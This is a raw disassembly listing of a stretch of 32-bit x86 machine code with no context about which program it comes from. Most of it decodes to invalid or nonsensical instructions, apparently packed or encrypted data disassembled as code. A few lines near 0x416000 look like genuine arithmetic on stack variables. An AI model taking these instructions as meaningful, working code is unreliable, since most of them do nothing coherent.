  415c19:	test   al,0xac
  415c1b:	dec    ebp
  415c1c:	fst    DWORD PTR [esi+0x14]
  415c1f:	loop   0x415c5f
  415c21:	ins    DWORD PTR es:[edi],dx
  415c22:	mov    cl,BYTE PTR [edx+0x4bd9b61e]
  415c28:	sbb    eax,0x7d376bc9
  415c2d:	call   0x87c4:0xdfa046f5
  415c34:	xchg   ecx,eax
  415c35:	cmc    
  415c36:	ret    
  415c37:	mov    cl,0x95
  415c39:	push   edx
  415c3a:	mov    esp,0xfe173e30
  415c3f:	or     eax,0xbf020aba
  415c44:	jg     0x415c79
  415c46:	hlt    
  415c47:	push   ss
  415c48:	mov    al,ds:0xeaa02d64
  415c4d:	adc    eax,DWORD PTR [edi-0x6751ad4b]
  415c53:	shl    BYTE PTR [eax+0x1a],1
  415c56:	push   ebx
  415c57:	dec    ecx
  415c58:	mov    ds:0x875f1842,eax
  415c5d:	jno    0x415c39
  415c5f:	jmp    FWORD PTR [edx+0x6f5f3800]
  415c65:	xchg   BYTE PTR ds:0x7d8485d7,cl
  415c6b:	cmc    
  415c6c:	leave  
  415c6d:	cs inc ebx
  415c6f:	rcr    edx,0x8d
  415c72:	add    BYTE PTR [ebx],ah
  415c74:	and    bl,al
  415c76:	rcr    bh,0x73
  415c79:	xchg   edi,eax
  415c7a:	or     eax,0x3e8a8196
  415c7f:	int    0x57
  415c81:	loop   0x415c05
  415c83:	adc    ebx,edx
  415c85:	cmp    eax,0x5cdcd4ef
  415c8a:	ins    BYTE PTR es:[edi],dx
  415c8b:	in     al,0x83
  415c8d:	add    bh,BYTE PTR [ecx]
  415c8f:	adc    eax,0x8ff690d4
  415c94:	(bad)  
  415c96:	aad    0xeb
  415c98:	stc    
  415c99:	mov    esp,0xb6e7dd03
  415c9e:	jl     0x415c78
  415ca0:	mov    ch,0xb9
  415ca2:	(bad)  
  415ca3:	sbb    eax,DWORD PTR [ecx]
  415ca5:	test   al,0xab
  415ca7:	inc    esp
  415ca8:	pop    ss
  415ca9:	jle    0x415c4b
  415cab:	je     0x415c8b
  415cad:	mov    eax,0xfb744452
  415cb2:	das    
  415cb3:	inc    esi
  415cb4:	stos   BYTE PTR es:[edi],al
  415cb5:	pushf  
  415cb6:	repnz mov ecx,0x4f2d6ec1
  415cbc:	cmp    ecx,DWORD PTR [edi]
  415cbe:	pop    eax
  415cbf:	inc    edi
  415cc0:	cdq    
  415cc1:	dec    edi
  415cc2:	mov    ds:0x132d20f4,eax
  415cc7:	adc    ch,bl
  415cc9:	(bad)  
  415ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ccc:	dec    esi
  415ccd:	in     eax,dx
  415cce:	cmp    eax,0xf74b0928
  415cd4:	gs push 0x18b37469
  415cda:	rol    BYTE PTR [esi+0x3ae6ed99],1
  415ce0:	out    0xf2,eax
  415ce2:	es arpl WORD PTR gs:[ebx+0x4e],dx
  415ce7:	mov    bh,0x57
  415ce9:	inc    ecx
  415cea:	push   0xffffffb3
  415cec:	mov    ds:0x38839921,al
  415cf1:	and    esi,DWORD PTR [esi-0x567fb78a]
  415cf7:	inc    ecx
  415cf8:	(bad)  
  415cfa:	fisttp DWORD PTR ds:0x63cd70c2
  415d00:	xchg   ecx,eax
  415d01:	rcr    BYTE PTR [ebx],1
  415d03:	xchg   ebx,eax
  415d04:	add    bh,bh
  415d06:	sub    DWORD PTR [esi-0x1fe73bbd],esi
  415d0c:	mov    bl,0x4
  415d0e:	xchg   BYTE PTR [ecx-0x59d8b6f9],al
  415d14:	call   0xe8d6b499
  415d19:	(bad)  
  415d1a:	mov    dh,0x7c
  415d1c:	fsubr  DWORD PTR [eax]
  415d1e:	push   esi
  415d1f:	mov    ecx,DWORD PTR [eax-0x27]
  415d22:	xor    eax,0x19b88014
  415d27:	inc    esi
  415d28:	jecxz  0x415d96
  415d2a:	cmp    ebx,esp
  415d2c:	enter  0xbf91,0xf4
  415d30:	cmp    ch,BYTE PTR [edx-0x62]
  415d33:	sbb    dl,BYTE PTR [esi-0x35ffe187]
  415d39:	sub    DWORD PTR [ebx+0x56],ebx
  415d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d3d:	pop    di
  415d3f:	push   eax
  415d40:	sub    al,0xb0
  415d42:	dec    ecx
  415d43:	jb     0x415ceb
  415d45:	adc    ah,dh
  415d47:	add    ecx,0x97360dd0
  415d4d:	inc    edx
  415d4e:	aam    0x9f
  415d50:	mov    eax,0x2d15d91a
  415d55:	or     eax,0x4299cbf6
  415d5a:	and    bl,BYTE PTR [edx+esi*8]
  415d5d:	sbb    al,0xb
  415d5f:	jns    0x415d4e
  415d61:	lods   al,BYTE PTR ds:[esi]
  415d62:	dec    eax
  415d63:	pop    esp
  415d64:	popa   
  415d65:	mov    bh,0x8f
  415d67:	push   eax
  415d68:	push   eax
  415d69:	mov    bl,0xc3
  415d6b:	outs   dx,DWORD PTR ds:[esi]
  415d6c:	mov    al,0xfb
  415d6f:	je     0x415d05
  415d71:	(bad)  
  415d72:	xor    edx,ecx
  415d74:	push   cs
  415d75:	daa    
  415d76:	fmul   DWORD PTR [ecx+eiz*8]
  415d79:	(bad)  
  415d7a:	rol    BYTE PTR [esi-0x1a],0x96
  415d7e:	(bad)  [ebp+ecx*2+0x7f]
  415d82:	add    eax,0xdb46e53a
  415d87:	jp     0x415df1
  415d89:	test   eax,0xfc0449ee
  415d8e:	fcomp  QWORD PTR [esi-0x576230b7]
  415d94:	inc    esi
  415d95:	aam    0x96
  415d97:	dec    edx
  415d98:	or     ch,cl
  415d9a:	call   0x8107125b
  415d9f:	add    dl,BYTE PTR [ecx-0xe439147]
  415da5:	mov    bh,0xd4
  415da7:	mov    fs,WORD PTR [esi-0x22]
  415daa:	inc    ebp
  415dab:	mov    ch,0x88
  415dad:	jmp    0xbfc2:0x5372
  415db3:	clc    
  415db4:	fisubr DWORD PTR [edi+0x74d13e56]
  415dba:	or     eax,0x7b0b61af
  415dbf:	pop    ebp
  415dc0:	add    eax,0x27a3cc4c
  415dc5:	cdq    
  415dc6:	aam    0x6e
  415dc8:	or     bl,BYTE PTR [ebp+0x75ed54d1]
  415dce:	pop    eax
  415dcf:	sbb    al,0xe6
  415dd1:	loop   0x415d56
  415dd3:	mov    edi,0xfe39876b
  415dd8:	ret    
  415dd9:	mov    BYTE PTR [esi+0x5c],bh
  415ddc:	cli    
  415ddd:	call   0xc5cf4905
  415de2:	adc    dh,dh
  415de4:	out    0xe,al
  415de6:	lea    edx,[esi+0x23]
  415de9:	pushf  
  415dea:	ret    
  415deb:	stos   DWORD PTR es:[edi],eax
  415dec:	sub    esi,0x4f
  415def:	repz jge 0x415e2e
  415df2:	push   0xffffffc7
  415df4:	into   
  415df5:	dec    ebp
  415df6:	stos   DWORD PTR es:[edi],eax
  415df7:	cwde   
  415df8:	lahf   
  415df9:	frstor [edx-0x10]
  415dfc:	pop    eax
  415dfd:	jl     0x415d8f
  415dff:	shl    DWORD PTR es:[esi-0x31],1
  415e03:	ja     0x415e1f
  415e05:	jmp    0x415e4b
  415e07:	ja     0x415e63
  415e09:	sahf   
  415e0a:	sub    DWORD PTR [eax-0x1bdee8b8],edx
  415e10:	popa   
  415e11:	sbb    eax,DWORD PTR [ebx]
  415e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e14:	jbe    0x415e28
  415e16:	daa    
  415e17:	les    edx,FWORD PTR [eax-0x14b5a857]
  415e1d:	add    al,dh
  415e1f:	pop    esp
  415e20:	in     eax,dx
  415e21:	jns    0x415e76
  415e23:	shr    bh,cl
  415e25:	in     al,dx
  415e26:	or     DWORD PTR [esi+0x19fc10af],eax
  415e2c:	fisttp QWORD PTR [ebx]
  415e2e:	mov    cl,0x6f
  415e30:	mov    edx,0x797cfec9
  415e35:	shl    BYTE PTR [edi+eax*4+0x69c19d47],0x51
  415e3d:	push   es
  415e3e:	adc    ecx,DWORD PTR [edi-0x17]
  415e41:	ret    
  415e42:	es xor eax,0xd5cac828
  415e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e49:	dec    esi
  415e4a:	mov    DWORD PTR ds:0xb39c696d,edx
  415e50:	fwait
  415e51:	mov    ds:0x28ccce82,eax
  415e56:	test   ch,0x27
  415e59:	pop    ss
  415e5a:	mov    bl,0xda
  415e5c:	rcr    ah,1
  415e5e:	lahf   
  415e5f:	jmp    0xccf1:0xc38234f4
  415e66:	mov    DWORD PTR [ecx],ebp
  415e68:	ret    0xb67f
  415e6b:	fwait
  415e6c:	push   0x4e15f7fe
  415e71:	out    dx,al
  415e72:	or     ecx,eax
  415e74:	push   ds
  415e75:	enter  0xfc9c,0x8c
  415e79:	mov    eax,0x14d2d9b9
  415e7e:	inc    esi
  415e7f:	add    al,0x4
  415e81:	push   ebp
  415e82:	cwd    
  415e84:	sbb    ah,BYTE PTR [ebp+ebp*2+0x580dfe58]
  415e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e8c:	mov    ds:0x4d5e8750,al
  415e91:	cmp    edi,0x623e0fe8
  415e97:	retf   
  415e98:	xchg   ebx,eax
  415e99:	sub    BYTE PTR [edi+ecx*1+0x78],cl
  415e9d:	mov    ebx,0xb3f7f574
  415ea2:	repz sbb DWORD PTR [ebx+0x26e973bc],ebp
  415ea9:	retf   
  415eaa:	cmp    bl,BYTE PTR [edx+0x2db2b052]
  415eb0:	jp     0x415edb
  415eb2:	push   edi
  415eb3:	or     BYTE PTR [eax],0x5d
  415eb6:	imul   ebx,DWORD PTR [esi+0x2e],0x973a6bf0
  415ebd:	fs loopne 0x415eac
  415ec0:	and    BYTE PTR [esi+eiz*2+0x250efd1],bl
  415ec7:	pop    edx
  415ec8:	xchg   esi,eax
  415ec9:	cs test al,0x3d
  415ecc:	pavgw  mm6,QWORD PTR [esi+eax*8-0x6b]
  415ed1:	or     ebp,DWORD PTR [esi+0x11428274]
  415ed7:	scas   al,BYTE PTR es:[edi]
  415ed8:	xchg   DWORD PTR [ebx+edx*2-0x48],edi
  415edc:	icebp  
  415edd:	cmp    DWORD PTR [edx+ebp*8+0xe],edi
  415ee1:	add    eax,0x9b4aa672
  415ee6:	pop    ebx
  415ee7:	adc    bh,BYTE PTR [ebx+0x7c432210]
  415eed:	xor    eax,0x75d279c6
  415ef2:	add    BYTE PTR [ebx+0x28f32328],cl
  415ef8:	sbb    ch,BYTE PTR [edi+0x2ff205cb]
  415efe:	fimul  WORD PTR [eax-0x58]
  415f01:	xor    edi,0xffffffd1
  415f04:	mov    ds:0x233b326a,al
  415f09:	add    bh,al
  415f0b:	mov    esp,0x884fc66c
  415f10:	(bad)  
  415f11:	cdq    
  415f12:	or     ecx,DWORD PTR [edx+0x4feaf662]
  415f18:	fimul  DWORD PTR ds:0xb9696538
  415f1e:	bound  esi,QWORD PTR [ecx-0x673b38b9]
  415f24:	mov    ebp,0x4b4efe36
  415f29:	sbb    al,0x8
  415f2b:	out    dx,al
  415f2c:	or     eax,0xf36a093e
  415f31:	push   ecx
  415f32:	scas   al,BYTE PTR es:[edi]
  415f33:	cmc    
  415f34:	jecxz  0x415f94
  415f36:	imul   DWORD PTR [edi]
  415f38:	mov    eax,es
  415f3a:	add    DWORD PTR [ebx],0xfffffffb
  415f3d:	mov    dl,0xcd
  415f3f:	test   al,0x3e
  415f41:	ficomp DWORD PTR [ebx-0x40746a73]
  415f47:	push   esi
  415f48:	enter  0x170b,0xaf
  415f4c:	dec    edi
  415f4d:	xchg   DWORD PTR [ebp-0x3e],edi
  415f50:	and    dh,bl
  415f52:	sub    ebx,DWORD PTR ss:[edi-0x57fe17e4]
  415f59:	lahf   
  415f5a:	repz in al,0xe6
  415f5d:	or     eax,0x44a08400
  415f62:	leave  
  415f63:	lahf   
  415f64:	cmp    DWORD PTR ds:0xf7e3bf99,edx
  415f6a:	ss int 0x97
  415f6d:	jcxz   0x415fd4
  415f70:	mov    ds:0x3cfaac2b,al
  415f75:	aad    0xa4
  415f77:	dec    esi
  415f78:	push   es
  415f79:	sbb    DWORD PTR ds:[ecx-0x422f620c],edx
  415f80:	mov    esi,0x88dea2b0
  415f85:	jnp    0x415f92
  415f87:	xor    BYTE PTR [eax],0x62
  415f8a:	cmp    eax,0xaa03b7a1
  415f8f:	mov    esp,0x1772d82e
  415f94:	imul   esi,DWORD PTR [edi+eiz*2+0x5],0x7c
  415f99:	(bad)  
  415f9a:	sub    esi,ebp
  415f9c:	adc    ch,ah
  415f9e:	sbb    BYTE PTR [eax],0x38
  415fa1:	icebp  
  415fa2:	imul   edx,edx,0xffffffaa
  415fa5:	ins    DWORD PTR es:[edi],dx
  415fa6:	jecxz  0x415f80
  415fa8:	mov    ds:0x811e5246,eax
  415fad:	(bad)  
  415fae:	or     dl,ah
  415fb0:	push   0xe
  415fb2:	idiv   BYTE PTR [edi]
  415fb4:	idiv   BYTE PTR [ecx-0x263ef597]
  415fba:	fnstenv ds:0x9681f162
  415fc0:	and    ebp,ebx
  415fc2:	mov    ecx,0x499b7d3b
  415fc7:	inc    eax
  415fc8:	mov    ds:0x45ec3ffa,al
  415fcd:	outs   dx,DWORD PTR ds:[esi]
  415fce:	or     BYTE PTR [eax],al
  415fd0:	pushf  
  415fd1:	mov    ch,0xaf
  415fd3:	pop    esp
  415fd4:	loope  0x416013
  415fd6:	test   esp,edx
  415fd8:	sbb    DWORD PTR [eax],edi
  415fda:	icebp  
  415fdb:	shl    BYTE PTR ds:0x8e3c8217,cl
  415fe1:	cmp    al,0xe3
  415fe3:	jg     0x415fb9
  415fe5:	inc    edi
  415fe7:	cdq    
  415fe8:	out    0x7e,al
  415fea:	and    eax,0x6bafa4f9
  415fef:	mov    WORD PTR [ebp-0x34f65d9f],gs
  415ff5:	neg    ebx
  415ff7:	pusha  
  415ff8:	icebp  
  415ff9:	push   ds
  415ffa:	cmp    ebx,DWORD PTR [ebp+0x3019a473]
  416000:	sbb    DWORD PTR [ebx],edx
  416002:	mov    BYTE PTR [edi-0x66],bl
  416005:	xor    edx,ebx
  416007:	mov    DWORD PTR [ebp-0x50],edx
  41600a:	mov    edx,DWORD PTR [ebp+0x8]
  41600d:	mov    ebx,DWORD PTR [ebp-0x4c]
  416010:	add    edx,edi
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0xcba3e5b4
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	jbe    0x41602c
  41605d:	dec    ebx
  41605e:	mov    ah,0x22
  416060:	dec    ebx
  416061:	cmc    
  416062:	in     eax,0x4b
  416064:	sahf   
  416065:	stc    
  416066:	ficomp WORD PTR [eax]
  416068:	rcr    BYTE PTR [edi-0xae99d65],0xe9
  41606f:	div    DWORD PTR [esi-0x5fce5283]
  416075:	loope  0x41605b
  416077:	inc    ebp
  416078:	cmp    al,0x1c
  41607a:	mov    cl,0x1d
  41607c:	mov    ds:0x7035c4ae,eax
  416081:	jle    0x41608e
  416083:	jge    0x4160df
  416085:	mov    ecx,0x2928817
  41608a:	jns    0x41609f
  41608c:	inc    ebp
  41608d:	fmul   DWORD PTR [ecx-0x1532130c]
  416093:	jl     0x416041
  416095:	(bad)  
  416096:	fbld   TBYTE PTR [esi]
  416098:	cmp    BYTE PTR [edx],bh
  41609a:	push   0xd3dcbdba
  41609f:	xor    al,0x1a
  4160a1:	jb     0x416068
  4160a3:	xlat   BYTE PTR ds:[ebx]
  4160a4:	or     eax,0x8856d986
  4160a9:	xchg   ecx,eax
  4160aa:	adc    al,0xd8
  4160ac:	loopne 0x416072
  4160ae:	sbb    ebp,0x81937ef5
  4160b4:	adc    DWORD PTR es:[edi+0x3],ecx
  4160b8:	xor    al,0x48
  4160ba:	sbb    eax,0xf37392d6
  4160bf:	idiv   BYTE PTR [ecx-0x2c300ec6]
  4160c5:	push   ebx
  4160c6:	sbb    al,0x21
  4160c8:	pop    esi
  4160c9:	aaa    
  4160ca:	jbe    0x416107
  4160cc:	shl    BYTE PTR [ecx-0x36],1
  4160cf:	mov    ecx,0x57226f48
  4160d4:	fisubr DWORD PTR [edx-0x24]
  4160d7:	fadd   QWORD PTR [edx-0x17]
  4160da:	push   ecx
  4160db:	pop    esi
  4160dc:	jmp    0x7bcf2f8f
  4160e1:	xchg   DWORD PTR [esi-0x178c6e3b],ebp
  4160e7:	push   cs
  4160e8:	int    0xda
  4160ea:	(bad)  
  4160eb:	dec    esi
  4160ec:	icebp  
  4160ed:	rcr    DWORD PTR [ecx],0xf4
  4160f0:	int3   
  4160f1:	dec    edx
  4160f2:	push   eax
  4160f3:	xchg   ax,ax
  4160f5:	dec    ebp
  4160f6:	aad    0x70
  4160f8:	cli    
  4160f9:	pop    es
  4160fa:	dec    ecx
  4160fb:	jns    0x4160cf
  4160fd:	adc    eax,0xffffffcc
  416100:	mul    DWORD PTR [edx]
  416102:	call   DWORD PTR [ebx-0x1df5ddf4]
  416108:	in     al,0x41
  41610a:	bound  edi,QWORD PTR [eax-0x59f95d22]
  416110:	push   ecx
  416111:	cmp    al,0xa8
  416113:	ret    
  416114:	or     BYTE PTR [edx],bh
  416116:	mov    BYTE PTR [edi-0x2b4d59be],0x2f
  41611d:	push   ebx
  41611e:	shl    eax,1
  416120:	xchg   ebp,eax
  416121:	test   al,0xfe
  416123:	push   0xf4f4c3a9
  416128:	dec    esp
  416129:	push   eax
  41612a:	push   0xffffffa0
  41612c:	inc    ecx
  41612d:	add    al,0xb5
  41612f:	push   ebp
  416130:	or     esp,ebp
  416132:	push   ds
  416133:	inc    eax
  416134:	lahf   
  416135:	mov    bh,0x22
  416137:	cmp    al,0x2a
  416139:	fstp   TBYTE PTR [esi+ebx*2]
  41613c:	jns    0x416199
  41613e:	rcl    DWORD PTR [ebp+0x3f],1
  416141:	dec    esp
  416142:	or     edi,edx
  416144:	lock mov eax,ds:0x478ac3c
  41614a:	icebp  
  41614b:	jmp    DWORD PTR [ecx-0x6c]
  41614e:	adc    DWORD PTR [ecx],ecx
  416150:	and    edx,edi
  416152:	or     al,bh
  416154:	(bad)  
  416155:	and    BYTE PTR [esi+0x31],ah
  416158:	arpl   bx,di
  41615a:	sti    
  41615b:	xlat   BYTE PTR ds:[ebx]
  41615c:	dec    edx
  41615d:	push   es
  41615e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41615f:	out    dx,eax
  416160:	dec    edx
  416161:	and    eax,0x5fc2784c
  416166:	out    0x16,eax
  416168:	ds popf 
  41616a:	dec    ecx
  41616b:	daa    
  41616c:	scas   al,BYTE PTR es:[edi]
  41616d:	push   ds
  41616e:	stos   DWORD PTR es:[edi],eax
  41616f:	inc    ebp
  416170:	ja     0x41618c
  416172:	ror    BYTE PTR [ebx+0x3b],0x83
  416176:	popf   
  416177:	fwait
  416178:	pop    eax
  416179:	and    al,0x4
  41617b:	xor    ecx,DWORD PTR [edx]
  41617d:	jbe    0x416194
  41617f:	clc    
  416180:	arpl   WORD PTR [ecx-0x79c41ac2],sp
  416186:	retf   
  416187:	sar    DWORD PTR ds:0x60c2a1ae,1
  41618d:	pushf  
  41618e:	xchg   ch,bh
  416190:	xchg   ebp,eax
  416191:	add    cl,BYTE PTR ds:0x4d7a993f
  416197:	addr16 inc edi
  416199:	mov    ds:0xecd61411,al
  41619e:	inc    esi
  41619f:	mov    al,ds:0xdfad9251
  4161a4:	or     DWORD PTR [edx-0x36fb8eb9],esi
  4161aa:	aaa    
  4161ab:	(bad)  
  4161ac:	std    
  4161ad:	lahf   
  4161ae:	push   es
  4161af:	mov    cl,0xd3
  4161b1:	jnp    0x416164
  4161b3:	add    eax,ecx
  4161b5:	sbb    al,0x6
  4161b7:	ret    0xbf3c
  4161ba:	inc    esp
  4161bb:	lahf   
  4161bc:	sbb    al,0xe8
  4161be:	leave  
  4161bf:	cmp    bh,dh
  4161c1:	xor    DWORD PTR [edx-0x10e10120],0xffffffe7
  4161c8:	outs   dx,DWORD PTR fs:[esi]
  4161ca:	xchg   edi,ebx
  4161cc:	push   0x3e
  4161ce:	imul   edx,DWORD PTR [ecx-0x3a],0x92b1118
  4161d5:	inc    esi
  4161d6:	sti    
  4161d7:	xor    al,0xf
  4161d9:	call   0x6114bb5b
  4161de:	jle    0x416204
  4161e0:	ds adc al,0xd3
  4161e3:	mov    ch,0x5e
  4161e5:	mov    al,0x21
  4161e7:	mov    DWORD PTR [ebp+0x421cc0bf],0x91360424
  4161f1:	mov    ?,WORD PTR [ebp-0x67d507b5]
  4161f7:	push   ebp
  4161f8:	sub    al,0xe
  4161fa:	push   ecx
  4161fb:	cmp    cl,dh
  4161fd:	shr    BYTE PTR [eax-0x6a01a45c],cl
  416203:	xchg   DWORD PTR [eax],edi
  416205:	dec    ebp
  416206:	sub    eax,0xc20a1511
  41620b:	js     0x416271
  41620d:	ins    BYTE PTR es:[edi],dx
  41620e:	pushf  
  41620f:	enter  0x6570,0x6b
  416213:	push   ds
  416214:	out    dx,eax
  416215:	jbe    0x416214
  416217:	nop
  416218:	inc    esi
  416219:	cs imul eax,ebp,0xbb19497a
  416220:	adc    ch,BYTE PTR [ebp+ebx*2-0x37]
  416224:	lods   eax,DWORD PTR ds:[esi]
  416225:	inc    eax
  416226:	jo     0x4161c8
  416228:	fnsave [esi]
  41622a:	lahf   
  41622b:	call   0x8a79:0xd422f270
  416232:	mov    BYTE PTR [edi+0xd],bl
  416235:	rol    DWORD PTR [ebx+0x76d25bcb],0x3c
  41623c:	sbb    eax,0x72b587eb
  416241:	imul   edi,DWORD PTR [ebx-0x35],0xac4fef10
  416248:	std    
  416249:	dec    ebx
  41624a:	ss loope 0x416228
  41624d:	mov    dh,bh
  41624f:	or     edi,DWORD PTR [edx+0x1755df69]
  416255:	jg     0x416267
  416257:	mov    bl,0xe2
  416259:	rcr    BYTE PTR [edx+0x56f2cb80],0xcf
  416260:	arpl   WORD PTR [ebx],bp
  416262:	add    al,0x88
  416264:	push   ecx
  416265:	mov    eax,ds:0xd5cb566e
  41626a:	mov    ds:0xaf4ddea0,al
  41626f:	mov    edi,0x69403b9a
  416274:	or     esp,DWORD PTR [ebx-0x1]
  416277:	cmp    eax,0x94219be
  41627c:	sub    ebp,edi
  41627e:	xor    al,0xf6
  416280:	pop    ebx
  416281:	mov    dl,0xf3
  416283:	lock mov WORD PTR [eax+ebp*1],gs
  416287:	fndisi(8087 only) 
  416289:	(bad)  
  41628a:	push   edi
  41628b:	inc    esi
  41628c:	sahf   
  41628d:	int    0x99
  41628f:	mov    dl,0xed
  416291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416292:	popf   
  416293:	push   eax
  416294:	mov    WORD PTR [edx+ecx*2],?
  416297:	mov    esi,0xee77bf17
  41629c:	aad    0x61
  41629e:	imul   esp,DWORD PTR [ebx+0xc],0xffffff84
  4162a2:	shl    DWORD PTR [eax+0x4e019c44],0x2a
  4162a9:	es pop eax
  4162ab:	dec    edi
  4162ac:	fcom   DWORD PTR ds:0xacd9718
  4162b2:	mov    ah,0x90
  4162b4:	mov    esp,0x1738adb1
  4162b9:	mov    ds:0x46ce25c0,al
  4162be:	out    dx,al
  4162bf:	call   0xeec:0xaf696370
  4162c6:	ja     0x416337
  4162c8:	pop    eax
  4162c9:	imul   ebx,DWORD PTR [esi-0x28e579f0],0xffffff93
  4162d0:	dec    edi
  4162d1:	mov    esp,0xe064e4d3
  4162d6:	inc    esp
  4162d7:	rol    DWORD PTR [esi-0x57dbd04d],1
  4162dd:	dec    esi
  4162de:	test   eax,0x88299501
  4162e3:	cdq    
  4162e4:	imul   ebx,ebp,0x14
  4162e7:	mov    esi,0x516db420
  4162ec:	pop    edx
  4162ed:	ins    DWORD PTR es:[edi],dx
  4162ee:	ds inc ecx
  4162f0:	test   al,0x5
  4162f2:	adc    eax,ebp
  4162f4:	ficom  DWORD PTR [esi-0x167dc4e4]
  4162fa:	scas   al,BYTE PTR es:[edi]
  4162fb:	jg     0x4162ce
  4162fd:	add    DWORD PTR [eax+0x3c0d9f06],esp
  416303:	loope  0x416320
  416305:	jmp    0x416300
  416307:	out    dx,al
  416308:	jle    0x4162d6
  41630a:	popa   
  41630b:	or     ah,al
  41630d:	jo     0x4162c4
  41630f:	sub    DWORD PTR [ebp+0x7f],0x6d
  416313:	jle    0x416370
  416315:	ins    BYTE PTR es:[edi],dx
  416316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416317:	dec    eax
  416318:	scas   eax,DWORD PTR es:[edi]
  416319:	scas   eax,DWORD PTR es:[edi]
  41631a:	int    0x39
  41631c:	test   eax,0x85ccad87
  416321:	jl     0x41638a
  416323:	inc    edx
  416324:	push   0x2e
  416326:	cmc    
  416327:	xchg   edi,eax
  416328:	mov    al,ch
  41632a:	arpl   WORD PTR [edi+0x2c],di
  41632d:	loopne 0x416357
  41632f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416330:	and    DWORD PTR [esi+0x1b],0x6f
  416334:	pop    esp
  416335:	fistp  WORD PTR [ecx]
  416337:	inc    edx
  416338:	lea    eax,[edx+0x5a]
  41633b:	fsubr  DWORD PTR [esi]
  41633d:	xchg   BYTE PTR [edx-0x39],al
  416340:	aam    0x24
  416342:	cs pop esi
  416344:	ja     0x416353
  416346:	and    DWORD PTR [ebx],esi
  416348:	xchg   ebx,eax
  416349:	jl     0x416327
  41634b:	xor    DWORD PTR [ebp+0x5eddd000],edi
  416351:	dec    edi
  416352:	adc    al,0xd
  416354:	lea    eax,[esi]
  416356:	xor    BYTE PTR [edi+0x48b1a4a9],dl
  41635c:	push   es
  41635d:	mov    al,0xb6
  41635f:	sub    eax,0xf4ac6f3
  416364:	mov    ebp,ebp
  416366:	mov    edi,0xcd7b041f
  41636b:	retf   
  41636c:	addr16 mov cl,0x28
  41636f:	sbb    BYTE PTR [eax],bh
  416371:	sbb    eax,DWORD PTR [edx]
  416373:	lea    esi,[esi+0x75475570]
  416379:	sahf   
  41637a:	mov    ebx,DWORD PTR [esi-0x76a56c9a]
  416380:	aas    
  416381:	icebp  
  416382:	sub    bl,BYTE PTR [ecx+edx*8+0x1d]
  416386:	mov    ebx,DWORD PTR [ebp-0x70c8a0b0]
  41638c:	jnp    0x4163d2
  41638e:	adc    eax,0x52ced978
  416393:	in     eax,dx
  416394:	fwait
  416395:	inc    ecx
  416396:	pusha  
  416397:	sbb    BYTE PTR [ebx+0x69],dh
  41639a:	ins    DWORD PTR es:[edi],dx
  41639b:	enter  0xb86,0x4c
  41639f:	cld    
  4163a0:	lods   al,BYTE PTR ds:[esi]
  4163a1:	subps  xmm5,XMMWORD PTR [ecx+0x19f3b2c7]
  4163a8:	jg     0x4163cb
  4163aa:	into   
  4163ab:	push   eax
  4163ac:	call   0x36be735e
  4163b1:	mov    dh,BYTE PTR [edx+0x23]
  4163b4:	call   DWORD PTR [edi-0x75]
  4163b7:	into   
  4163b8:	lds    edx,FWORD PTR [eax-0x9323ade]
  4163be:	and    al,0x23
  4163c0:	into   
  4163c1:	leave  
  4163c2:	cmp    ecx,DWORD PTR [esi+0x59]
  4163c5:	and    bh,dl
  4163c7:	(bad)  
  4163c8:	push   esi
  4163c9:	inc    esp
  4163ca:	xchg   esi,eax
  4163cb:	xor    eax,DWORD PTR ds:0x2f21eb32
  4163d1:	jmp    0x4163d7
  4163d3:	test   DWORD PTR [ebp-0x4],ebx
  4163d6:	outs   dx,DWORD PTR ds:[esi]
  4163d7:	fwait
  4163d8:	stc    
  4163d9:	jmp    0x594de2da
  4163de:	jns    0x4163e3
  4163e0:	mov    bh,0xd6
  4163e2:	xor    al,bl
  4163e4:	mov    esp,edi
  4163e6:	outs   dx,BYTE PTR ds:[esi]
  4163e7:	sar    BYTE PTR [edi+ebx*4],1
  4163ea:	fild   WORD PTR ds:0x15be5ebf
  4163f0:	fnstenv [edi-0x34]
  4163f3:	imul   ebx,DWORD PTR [bx+di+0x31],0xcd38ab10
  4163fb:	inc    ebp
  4163fc:	ss sbb eax,0xb0dae428
  416402:	xchg   esp,eax
  416403:	cdq    
  416404:	leave  
  416405:	rcl    DWORD PTR [ecx-0x5e],0xf6
  416409:	pop    ebp
  41640a:	dec    ebx
  41640c:	and    al,0x91
  41640e:	push   esp
  41640f:	ret    0x1ffb
  416412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416413:	ror    ebx,cl
  416415:	cmp    eax,0x771425d1
  41641a:	xor    BYTE PTR [edi],0x88
  41641d:	adc    al,0x65
  41641f:	popf   
  416420:	sub    DWORD PTR gs:[esi-0x1b93320d],eax
  416427:	icebp  
  416428:	jb     0x416422
  41642a:	sahf   
  41642b:	test   dh,cl
  41642d:	test   BYTE PTR [ecx-0x7dd43cb8],dh
  416433:	inc    esi
  416434:	mov    ecx,0xebbe9aa8
  416439:	jne    0x41645f
  41643b:	mov    dh,0x5c
  41643d:	(bad)  
  41643e:	je     0x416497
  416440:	mov    edx,0xad8eafa6
